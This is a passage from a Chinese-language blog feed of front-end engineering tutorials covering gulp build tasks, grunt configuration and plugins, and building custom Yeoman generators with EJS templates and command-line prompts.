class="comment">// 开发过程中的任务，先编译再起服务器</span></span><br><span class="line"><span class="keyword">const</span> develop = series(compile, serve)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  compile,</span><br><span class="line">  build,</span><br><span class="line">  serve,</span><br><span class="line">  develop</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>现在html文件中存在引用外部文件的方式</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- build:css assets/styles/main.css --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"assets/styles/main.css"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- endbuild --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 处理成下面这种 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"assets/styles/vendor.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>需要安装<code>useref</code>插件：<code>cnpm install -D gulp-useref</code></strong>，在<code>gulpfile.js</code>中创建一个新任务</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> useref = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> src(<span class="string">'dist/*.html'</span>, &#123; <span class="attr">base</span>: <span class="string">'dist'</span> &#125;)</span><br><span class="line">    .pipe(plugins.useref(&#123; <span class="attr">searchPath</span>: [<span class="string">'dist'</span>, <span class="string">'.'</span>] &#125;))</span><br><span class="line">    .pipe(dest(<span class="string">'dist'</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h3><p>安装<code>cnpm install -D gulp-htmlmin gulp-uglify gulp-clean-css</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> min = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> src(<span class="string">'dist/**'</span>, &#123; <span class="attr">base</span>: <span class="string">'dist'</span> &#125;)</span><br><span class="line">    .pipe(plugins.if(<span class="regexp">/\.js$/</span>, plugins.uglify()))</span><br><span class="line">    .pipe(plugins.if(<span class="regexp">/\.css$/</span>, plugins.cleanCss()))</span><br><span class="line">    .pipe(plugins.if(<span class="regexp">/\.html$/</span>, plugins.htmlmin(&#123;</span><br><span class="line">      collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">      minifyCSS: <span class="literal">true</span>,</span><br><span class="line">      minifyJS: <span class="literal">true</span></span><br><span class="line">    &#125;)))</span><br><span class="line">    .pipe(dest(<span class="string">'release'</span>)) <span class="comment">// 如果写dist会有文件冲突</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决办法是把目前的dist改为temp，作为中间文件，最后再压缩到dist中</span></span><br></pre></td></tr></table></figure><h3 id="构建完成的处理"><a href="#构建完成的处理" class="headerlink" title="构建完成的处理"></a>构建完成的处理</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选择需要导出的任务</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  build,</span><br><span class="line">  develop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把他写在package.json中</span></span><br><span class="line"><span class="string">"scripts"</span>: &#123;</span><br><span class="line">    <span class="string">"build"</span>: <span class="string">"gulp build"</span>,</span><br><span class="line">    <span class="string">"develop"</span>: <span class="string">"gulp develop"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="封装工作流"><a href="#封装工作流" class="headerlink" title="封装工作流"></a>封装工作流</h3><p><strong>将构建过程封装，发布并使用模块，就不必在每个项目中单独去重复写<code>gulpfile.js</code></strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自动化构建与grunt</title>
      <link href="2020/08/31/%E6%95%B4%E7%90%86-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%84%E5%BB%BA%E4%B8%8Egrunt/"/>
      <url>2020/08/31/%E6%95%B4%E7%90%86-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%84%E5%BB%BA%E4%B8%8Egrunt/</url>
      
        <content type="html"><![CDATA[<ul><li>自动化构建</li><li>grunt</li><li>grunt的使用和插件</li></ul><a id="more"></a> <h2 id="什么是自动化构建"><a href="#什么是自动化构建" class="headerlink" title="什么是自动化构建"></a>什么是自动化构建</h2><p>比如在项目中需要通过<code>sass main.css</code>来编译css文件，不必要每次都使用命令行命令来编译。</p><p>可以用<code>npm scripts</code>来实现自动化构建，在<code>package.json</code>中书写</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 类似与这种就是自动化构建 </span><br><span class="line">"scripts": &#123;</span><br><span class="line">    "dev": "webpack-dev-server --inline --progress --config build/webpack.dev.conf.js",</span><br><span class="line">    "start": "npm run dev",</span><br><span class="line">    "build": "node build/build.js",</span><br><span class="line">    "lint": "eslint --fix --ext .js,.vue src",</span><br><span class="line">    "precommit": "npm run lint"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="grunt"><a href="#grunt" class="headerlink" title="grunt"></a>grunt</h2><p>grunt是一款构建工具，在项目中使用<code>npm init</code>初始化一个<code>package.json</code>文件，然后使用<code>npm install grunt</code></p><p>安装，安装成功之后创建<code>gruntfile.js</code>作为入口文件，编写如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Grunt的入口文件</span></span><br><span class="line"><span class="comment">// 需要导出一个函数，此函数接收一个 grunt 的形参</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">grunt</span> =&gt;</span> &#123;</span><br><span class="line">  grunt.registerTask(<span class="string">'foo'</span>, ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello grunt'</span>)</span><br><span class="line">  &#125;) <span class="comment">// grunt foo</span></span><br><span class="line"></span><br><span class="line">  grunt.registerTask(<span class="string">'bar'</span>, ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello grunt bar'</span>)</span><br><span class="line">  &#125;) <span class="comment">// grunt bar</span></span><br><span class="line"></span><br><span class="line">  grunt.registerTask(<span class="string">'default'</span>, ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'default task'</span>)</span><br><span class="line">  &#125;) <span class="comment">// grunt</span></span><br><span class="line"></span><br><span class="line">  grunt.registerTask(<span class="string">'default'</span>, [<span class="string">'foo'</span>, <span class="string">'bar'</span>]) <span class="comment">// grunt</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 模拟异步任务</span></span><br><span class="line">  grunt.registerTask(<span class="string">'async'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> done = <span class="keyword">this</span>.async()</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'async task'</span>)</span><br><span class="line">      done()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, <span class="number">1000</span>) <span class="comment">// grunt async</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 标记任务失败</span></span><br><span class="line">  grunt.registerTask(<span class="string">'bad'</span>, ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello grunt bar'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;) <span class="comment">// grunt bad 会执行失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>initConfig</code>方法</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">grunt</span> =&gt;</span> &#123;</span><br><span class="line">    grunt.initConfig(&#123;</span><br><span class="line">        foo: &#123;</span><br><span class="line">            bar: <span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)  </span><br><span class="line">  </span><br><span class="line">  grunt.registerTask(<span class="string">'foo'</span>, ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(grunt.config(<span class="string">'foo.bar'</span>))</span><br><span class="line">  &#125;) <span class="comment">// grunt foo 输出 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>多目标任务</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">grunt</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  grunt.initConfig(&#123;</span><br><span class="line">    build: &#123;</span><br><span class="line">      options: &#123; <span class="comment">// 配置选项</span></span><br><span class="line">        foo: <span class="string">'bar'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      css: &#123;</span><br><span class="line">        options: &#123;</span><br><span class="line">          foo: <span class="string">'baz'</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      js: <span class="string">'2'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 多目标模式，可以让任务根据配置形成多个子任务</span></span><br><span class="line">  grunt.registerMultiTask(<span class="string">'build'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.options())</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`target: <span class="subst">$&#123;<span class="keyword">this</span>.target&#125;</span>, data: <span class="subst">$&#123;<span class="keyword">this</span>.data&#125;</span>`</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// grunt build</span></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"></span><br><span class="line">Running <span class="string">"build:css"</span> (build) task</span><br><span class="line">&#123; <span class="attr">foo</span>: <span class="string">'baz'</span> &#125;</span><br><span class="line">target: css, <span class="attr">data</span>: [object <span class="built_in">Object</span>]</span><br><span class="line"></span><br><span class="line">Running <span class="string">"build:js"</span> (build) task</span><br><span class="line">&#123; <span class="attr">foo</span>: <span class="string">'bar'</span> &#125;</span><br><span class="line">target: js, <span class="attr">data</span>: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">Done.</span><br></pre></td></tr></table></figure><p><strong>插件使用：clean插件删除文件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">grunt</span> =&gt;</span> &#123;</span><br><span class="line">    grunt.initConfig(&#123;</span><br><span class="line">        clean: &#123;</span><br><span class="line">            temp: <span class="string">'temp/**'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    grunt.loadNpmTasks(<span class="string">'grunt-contrib-clean'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// grunt clean 可删除temp下对应文件</span></span><br></pre></td></tr></table></figure><ul><li>grunt-sass</li><li>grunt-babel</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sass = <span class="built_in">require</span>(<span class="string">'sass'</span>)</span><br><span class="line"><span class="keyword">const</span> loadGruntTasks = <span class="built_in">require</span>(<span class="string">'load-grunt-tasks'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">grunt</span> =&gt;</span> &#123;</span><br><span class="line">  grunt.initConfig(&#123;</span><br><span class="line">    sass: &#123;</span><br><span class="line">      options: &#123;</span><br><span class="line">        sourceMap: <span class="literal">true</span>, <span class="comment">// 生成map文件</span></span><br><span class="line">        implementation: sass</span><br><span class="line">      &#125;,</span><br><span class="line">      main: &#123;</span><br><span class="line">        files: &#123;</span><br><span class="line">          <span class="string">'dist/css/main.css'</span>: <span class="string">'src/scss/main.scss'</span> <span class="comment">// 目录</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    babel: &#123;</span><br><span class="line">      options: &#123;</span><br><span class="line">        sourceMap: <span class="literal">true</span>,</span><br><span class="line">        presets: [<span class="string">'@babel/preset-env'</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      main: &#123;</span><br><span class="line">        files: &#123;</span><br><span class="line">          <span class="string">'dist/js/app.js'</span>: <span class="string">'src/js/app.js'</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    watch: &#123; <span class="comment">// 监听</span></span><br><span class="line">      js: &#123;</span><br><span class="line">        files: [<span class="string">'src/js/*.js'</span>],</span><br><span class="line">        tasks: [<span class="string">'babel'</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      css: &#123;</span><br><span class="line">        files: [<span class="string">'src/scss/*.scss'</span>],</span><br><span class="line">        tasks: [<span class="string">'sass'</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// grunt.loadNpmTasks('grunt-sass')</span></span><br><span class="line">  loadGruntTasks(grunt) <span class="comment">// 自动加载所有的 grunt 插件中的任务</span></span><br><span class="line"></span><br><span class="line">  grunt.registerTask(<span class="string">'default'</span>, [<span class="string">'sass'</span>, <span class="string">'babel'</span>, <span class="string">'watch'</span>]) <span class="comment">// 首先执行 sass, babel 任务，再监听</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yeoman脚手架工具</title>
      <link href="2020/08/28/%E6%95%B4%E7%90%86-%E5%B7%A5%E7%A8%8B%E5%8C%96%E4%B8%8E%E8%84%9A%E6%89%8B%E6%9E%B6/"/>
      <url>2020/08/28/%E6%95%B4%E7%90%86-%E5%B7%A5%E7%A8%8B%E5%8C%96%E4%B8%8E%E8%84%9A%E6%89%8B%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<ul><li>工程化和脚手架的理解</li><li>yeoman</li><li>sub-generator</li><li>自定义Generator来搭建自己的脚手架</li><li>如何创建一个自定义的vue脚手架</li></ul><a id="more"></a> <h2 id="工程化和脚手架的理解"><a href="#工程化和脚手架的理解" class="headerlink" title="工程化和脚手架的理解"></a>工程化和脚手架的理解</h2><p>谈谈你对工程化的初步认识？</p><blockquote><p>前端工程化我认为可以提高开发效率，提高代码质量，简便流程。</p><p>就目前公司所做的项目来说，工程化所带来的优点是，无论从项目的编码到编译，打包到部署，都十分方便和规范，对开发人员特别友好。</p></blockquote><p>你认为脚手架除了为我们创建项目结构，还有什么更深的意义？</p><blockquote><p>我觉得脚手架是帮我们减少「为减少重复性工作而做的重复性工作」的工具，只需要几行命令，目录结构，脚本，配置等等都已经搞好了，我们只需要写核心代码就好，而不用关心其他重复性的事情。</p></blockquote><h2 id="yeoman"><a href="#yeoman" class="headerlink" title="yeoman"></a>yeoman</h2><p>在谈论脚手架时，我们想到的都是<code>vue-cli</code>等比较集成的脚手架，而Yeoman是一种通用的工具，便于创建属于自己的脚手架，很值得学习。</p><blockquote><p>Yeoman主要有三部分组成：yo（脚手架工具）、grunt（构建工具）、bower（包管理器）。这三个工具是分别独立开发的，但是需要配合使用，来实现我们高效的工作流模式。 </p></blockquote><p>安装：<code>cnpm install -g yo grunt-cli bower</code></p><p>安装后在命令行中输入 yo，在这里显示的是我的系统中已经安装的generator的库</p><p>可以选择<code>install generator</code>，然后搜索我们想安装的generator，比如webapp，然后安装即可。</p><hr><p>现在我们要使用<code>generator-node</code>：creates a base template to start a new Node.js module.</p><p>直接运行<code>yo node</code>，则会直接在文件夹中创建好目录结构</p><h3 id="sub-generator"><a href="#sub-generator" class="headerlink" title="sub-generator"></a>sub-generator</h3><p>如果不需要生成整个项目结构，只需生成ESLint等配置文件，就可以用sub-generator,用<code>:</code>来表示</p><p><code>yo node:cli</code>：其中的<code>cli</code>就是子集生成器</p><h3 id="总结一下使用步骤"><a href="#总结一下使用步骤" class="headerlink" title="总结一下使用步骤"></a>总结一下使用步骤</h3><ol><li>明确需求</li><li>找到合适的Generator</li><li>全局范围安装找到的Generator</li><li>通过Yo运行对应的Generator</li><li>通过命令行交互填写选项</li><li>生成你所需要的项目结构</li></ol><h3 id="自定义Generator来搭建自己的脚手架"><a href="#自定义Generator来搭建自己的脚手架" class="headerlink" title="自定义Generator来搭建自己的脚手架"></a>自定义Generator来搭建自己的脚手架</h3><p>比如用<code>vue-cli</code>创建项目时，并没有<code>vue-router,vuex</code>等，需要手动引入，如果把这些也放入脚手架中就很方便</p><p>首先使用<code>npm init</code>初始化一个<code>package.json</code>文件</p><p>安装<code>cnpm install yeoman-generator</code>,提供了生成器的基类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Generator的一个基本结构如下</span><br><span class="line"></span><br><span class="line">|- generators/..........生成器目录</span><br><span class="line">|-    app/..............默认生成器目录</span><br><span class="line">|-       index.js.......默认生成器实现</span><br><span class="line">|-    templates/foo.txt..模板文件</span><br><span class="line">|-package.json..........模块包配置文件</span><br></pre></td></tr></table></figure><blockquote><p>其中的index.js是作为Generator 的核心入口</p><p>需要导出一个继承自 Yeoman Generator 的类型</p><p>Yeoman Generator 在工作时会自动调用此类型定义的方法</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Generator = <span class="built_in">require</span>(<span class="string">'yeoman-generator'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    writing () &#123;</span><br><span class="line">        <span class="comment">// Yeoman 自动在生成文件阶段调用此方法</span></span><br><span class="line">        <span class="comment">// 我们尝试往项目目录中写入文件</span></span><br><span class="line">        <span class="keyword">this</span>.fs.write(</span><br><span class="line">        <span class="keyword">this</span>.destinationPath(<span class="string">'temp.txt'</span>),</span><br><span class="line">            <span class="built_in">Math</span>.random().toString()</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 还可以通过模板方式写入文件到目标目录</span></span><br><span class="line">        <span class="comment">// 模板文件路径</span></span><br><span class="line">        <span class="keyword">const</span> tmpl = <span class="keyword">this</span>.templatePath(<span class="string">'foo.txt'</span>)</span><br><span class="line">        <span class="comment">// 输出目标路径</span></span><br><span class="line">        <span class="keyword">const</span> output = <span class="keyword">this</span>.destinationPath(<span class="string">'foo.txt'</span>)</span><br><span class="line">        <span class="comment">// 模板数据上下文</span></span><br><span class="line">        <span class="keyword">const</span> context = &#123; <span class="attr">title</span>: <span class="string">'hello'</span>, <span class="attr">success</span>: <span class="literal">false</span> &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">this</span>.fs.copyTpl(tmpl, output, context)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写好之后使用<code>npm link</code>使其成为一个全局模块包，这样在别的地方也能使用<code>yo &#39;name&#39;</code>调用这个模块</p><h4 id="使用模板文件"><a href="#使用模板文件" class="headerlink" title="使用模板文件"></a>使用模板文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">模板文件，支持 EJS 模板标记</span><br><span class="line">&lt;%= title %&gt;</span><br><span class="line"></span><br><span class="line">&lt;% if (success) &#123; %&gt;</span><br><span class="line">哈哈哈</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line"></span><br><span class="line">title和success在模板上下文中赋值</span><br></pre></td></tr></table></figure><p>之后同样运行<code>yo &#39;name&#39;</code>创建模板文件，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">模板文件，支持 EJS 模板标记</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><h3 id="如何使用命令行交互的方式实现询问用户输入"><a href="#如何使用命令行交互的方式实现询问用户输入" class="headerlink" title="如何使用命令行交互的方式实现询问用户输入"></a>如何使用命令行交互的方式实现询问用户输入</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Generator = <span class="built_in">require</span>(<span class="string">'yeoman-generator'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    prompting () &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.prompt([</span><br><span class="line">        &#123;</span><br><span class="line">          type: <span class="string">'input'</span>,</span><br><span class="line">          name: <span class="string">'name'</span>, <span class="comment">// 命令行需要输入的</span></span><br><span class="line">          message: <span class="string">'Your project name'</span>,</span><br><span class="line">          <span class="keyword">default</span>: <span class="keyword">this</span>.appname</span><br><span class="line">        &#125;</span><br><span class="line">      ])</span><br><span class="line">      .then(<span class="function"><span class="params">answers</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.answers = answers</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    writing () &#123;</span><br><span class="line">        <span class="comment">// 模板文件路径</span></span><br><span class="line">        <span class="keyword">const</span> tmpl = <span class="keyword">this</span>.templatePath(<span class="string">'bar.html'</span>) <span class="comment">// 在bar.html中可以写 &lt;h1&gt;&lt;%= name %&gt;&lt;/h1&gt;</span></span><br><span class="line">        <span class="comment">// 输出目标路径</span></span><br><span class="line">        <span class="keyword">const</span> output = <span class="keyword">this</span>.destinationPath(<span class="string">'bar.html'</span>)</span><br><span class="line">        <span class="comment">// 模板数据上下文</span></span><br><span class="line">        <span class="keyword">const</span> context = <span class="keyword">this</span>.answers <span class="comment">// name传进上下文</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">this</span>.fs.copyTpl(tmpl, output, context)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如何创建一个自定义的vue脚手架"><a href="#如何创建一个自定义的vue脚手架" class="headerlink" title="如何创建一个自定义的vue脚手架"></a>如何创建一个自定义的vue脚手架</h3><ul><li>把写好的vue文件目录结构拷贝到<code>templates</code>目录下</li><li>重写<code>writing方法</code>，因为不只是创建单个文件，每一个文件都需要创建</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Generator = <span class="built_in">require</span>(<span class="string">'yeoman-generator'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    prompting () &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.prompt([</span><br><span class="line">        &#123;</span><br><span class="line">          type: <span class="string">'input'</span>,</span><br><span class="line">          name: <span 